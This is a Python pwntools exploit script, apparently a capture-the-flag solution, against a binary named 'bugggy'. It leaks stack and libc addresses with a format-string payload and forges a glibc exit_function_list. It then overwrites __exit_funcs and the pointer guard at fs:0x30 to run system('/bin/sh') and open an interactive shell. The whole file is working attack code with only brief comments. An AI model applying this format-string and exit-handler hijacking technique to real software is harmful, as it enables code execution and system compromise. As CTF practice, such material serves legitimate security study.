#!/usr/bin/python3

from pwn import *
import sys


context.arch = 'amd64'

BIN = './bugggy'
e = ELF(BIN)
r = process(BIN)

r.sendlineafter("For example, what's your name ?\n", "%7$p%10$p")
res = r.recvline()[:-1].replace(b'hi, ', b'')
mmap_base, code_base = int(res[:14], 16), int(res[14:], 16) - 0x4010
libc_base = mmap_base - 0x232000
_system = libc_base + 0x55411 # 0x1 for mangle fucntion will generate 0x20, which byte makes scanf interrupt
binsh = libc_base + 0x1b75aa

success(f'code base: {hex(code_base)}')
success(f'libc base: {hex(libc_base)}')
success(f'mmap base: {hex(mmap_base)}')

def mangle(addr):
	return (addr << 0x11) & (2**64 - 1)

"""
struct exit_function_list
  {
    struct exit_function_list *next;
    size_t idx;
    struct exit_function fns[32];
  };
# https://elixir.bootlin.com/glibc/glibc-2.32/source/stdlib/exit.h#L34
struct exit_function;

payload:
	next => 0,
	idx => 1, (must > 0)
	exit_function => (
		flavor, (ef_cxa, 4)
		system, (func.fn)
		"/bin/sh", (func.arg),
	)
"""
payload = flat(0, 1, 4, mangle(_system), binsh)
print(hex(mangle(_system)))
r.sendlineafter('something wrong ?', b'Yes'.ljust(8, b'\x00') + payload)

def get_target1(addr):
    return ((addr - mmap_base - 8) // 4) - 4

def get_target2(addr):
    return ((addr - mmap_base) // 8) - 4

"""
https://elixir.bootlin.com/glibc/glibc-2.32/source/stdlib/exit.c#L137
1. overwrite __exit_funcs to fake exit_function_list
2. overwrite fs:0x30 to 0, then xor will do nothing
"""
__exit_funcs = libc_base + 0x1eb718
fs_30 = libc_base + 0x1f3540 + 0x30
r.sendlineafter("That's right.", f"{mmap_base + 0x18} {get_target1(__exit_funcs)}")
r.sendlineafter("And which vulnerability", f"{get_target2(fs_30)}")

r.interactive()
